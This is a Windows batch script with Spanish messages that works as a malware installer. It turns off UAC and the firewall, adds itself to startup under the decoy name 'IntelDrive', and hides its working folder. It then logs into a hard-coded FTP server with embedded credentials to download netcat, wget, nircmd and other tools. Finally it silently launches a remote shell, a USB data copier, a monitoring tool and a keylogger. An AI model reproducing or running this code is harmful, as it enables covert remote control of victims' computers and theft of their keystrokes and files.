@ECHO OFF
CLS
@ECHO OFF
COLOR 00A
ECHO EJECUTANDO PROGRAMA...

if exist C:\ProgramData\tool\A_D.dat goto EJE

set server=dostg.ddns.net
set user=lordbunny
set password=125643
:EJECUTAR_PROGRAMAS
set NC=1
set batSHELL=1
set batUSB=1
set HTPC=1
set batKEY=1
set NIRCMD=1
set WGET=1
set NCFTP=1

ECHO DESACTIVANDO PROTECCIONES...
ECHO Desactivando UAC...
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

ECHO Desactivando firewall...
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off

ECHO AÑADIENDO AL INICIO...
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v IntelDrive /t REG_SZ /d "C:\ProgramData\tool\IntelDrive.bat" /f

ECHO Añadiendo FTP a excepciones...
netsh advfirewall firewall add rule name="ncftp" dir=in action=allow program="C:\ProgramData\tool\ncftp.exe" enable=yes
netsh firewall add allowedprogram C:\ProgramData\tool\ncftp.exe "ncftp" ENABLE

netsh advfirewall firewall add rule name="ftp" dir=in action=allow program="C:\Windows\System32\ftp.exe" enable=yes
netsh firewall add allowedprogram C:\Windows\System32\ftp.exe "ftp" ENABLE

netsh advfirewall firewall add rule name="ncftpput" dir=in action=allow program="C:\ProgramData\tool\ncftpput.exe" enable=yes
netsh firewall add allowedprogram C:\ProgramData\tool\ncftpput.exe "ncftpput" ENABLE

netsh advfirewall firewall add rule name="ncftpget" dir=in action=allow program="C:\ProgramData\tool\ncftpget.exe" enable=yes
netsh firewall add allowedprogram C:\ProgramData\tool\ncftpget.exe "ncftpget" ENABLE

netsh advfirewall firewall add rule name="ncftpls" dir=in action=allow program="C:\ProgramData\tool\ncftpls.exe" enable=yes
netsh firewall add allowedprogram C:\ProgramData\tool\ncftpls.exe "ncftpls" ENABLE

netsh advfirewall firewall add rule name="wget" dir=in action=allow program="C:\ProgramData\tool\wget.exe" enable=yes
netsh firewall add allowedprogram C:\ProgramData\tool\wget.exe "wget" ENABLE

netsh advfirewall firewall add rule name="htpc" dir=in action=allow program="C:\ProgramData\tool\htpcons.exe" enable=yes
netsh firewall add allowedprogram C:\ProgramData\tool\htpcons.exe "htpc" ENABLE

netsh advfirewall firewall add rule name="NC" dir=in action=allow program="C:\ProgramData\tool\NC.exe" enable=yes
netsh firewall add allowedprogram C:\ProgramData\tool\NC.exe "NC" ENABLE

mkdir C:\ProgramData\tool
attrib +h C:\ProgramData\tool

echo cd C:\ProgramData\tool>C:\ProgramData\tool\IntelDrive.bat
echo nircmd.exe exec2 hide C:\ProgramData\tool "C:\ProgramData\tool\TWICE.bat">>C:\ProgramData\tool\IntelDrive.bat

mkdir C:\ProgramData\tool\USBDATA
mkdir C:\ProgramData\tool\SCREENSHOTS

ECHO DESCARGANDO Y CONFIGURANDO SUBPROGRAMAS...

:_RAR
echo open %server%>LOGGIN.ftp
echo user %user% %password%>>LOGGIN.ftp
echo binary>>LOGGIN.ftp
echo get Rar.exe>>LOGGIN.ftp
echo get ncftpget.exe>>LOGGIN.ftp
echo bye>>LOGGIN.ftp
ping localhost -n 2 >nul
ftp -n <LOGGIN.ftp

xcopy /c /y Rar.exe C:\ProgramData\tool
xcopy /c /y ncftpget.exe C:\ProgramData\tool
del LOGGIN.ftp

C:
cd C:\ProgramData\tool 

:_NC
IF %NC%==0 GOTO _HTPC
ncftpget -u %user% -p %password% %server% . /data/nc.rar
RAR.exe e nc.rar

:_HTPC
IF %HTPC%==0 GOTO _batKEY
ncftpget -u %user% -p %password% %server% . /data/HTPC.rar
RAR.exe e htpc.rar

:_batKEY
IF %batKEY%==0 GOTO _NIRCMD
ncftpget -u %user% -p %password% %server% . /data/batKEY.rar
RAR.EXE e batKEY.rar

:_NIRCMD
IF %NIRCMD%==0 GOTO _WGET
if exist C:\Windows\Syswow64 goto x64
ncftpget -u %user% -p %password% %server% . /data/nircmd.rar
RAR.EXE e nircmd.rar
goto _WGET
:x64
ncftpget -u %user% -p %password% %server% . /data/nircmd-x64.rar
RAR.EXE e nircmd-x64.rar

:_WGET
IF %WGET%==0 GOTO _NCFTP
ncftpget -u %user% -p %password% %server% . /data/WGET.rar
RAR.EXE e WGET.rar

:_NCFTP
ncftpget -u %user% -p %password% %server% . /data/ncftp.rar
RAR.EXE e ncftp.rar 

:batSHELL
ncftpget -u %user% -p %password% %server% . /data/batSHELL.bat

:batUSB
ncftpget -u %user% -p %password% %server% . /data/batUSB.bat

echo Configurado>A_D.dat

:EJE

ECHO EJECUTANDO SUBPROGRAMAS...

if exist "C:\Documents and Settings\All Users\Datos de programa" goto wxp

:w7
mkdir C:\ProgramData\htpc
copy C:\ProgramData\tool\*.dat C:\ProgramData\htpc\
goto batSHELL

:wxp
mkdir "C:\Documents and Settings\All Users\Datos de programa\htpc"
copy C:\ProgramData\tool\*.dat "C:\Documents and Settings\All Users\Datos de programa\htpc"\

:batSHELL
echo Ejecutando shell remota...
nircmd exec2 hide C:\ProgramData\tool "C:\ProgramData\tool\batSHELL.bat"
ping localhost -n 2 >nul

:batUSB
echo Ejecutando copiador de datos de USB...
nircmd exec2 hide C:\ProgramData\tool "C:\ProgramData\tool\batUSB.bat"
ping localhost -n 1 >nul

:HTPC
echo Ejecutando control parental...
nircmd exec2 hide C:\ProgramData\tool "C:\ProgramData\tool\htpcons.exe"
ping localhost -n 1 >nul

:batKEY
echo Ejecutando Keylogger...
nircmd exec2 hide C:\ProgramData\tool "C:\ProgramData\tool\batKEY.exe"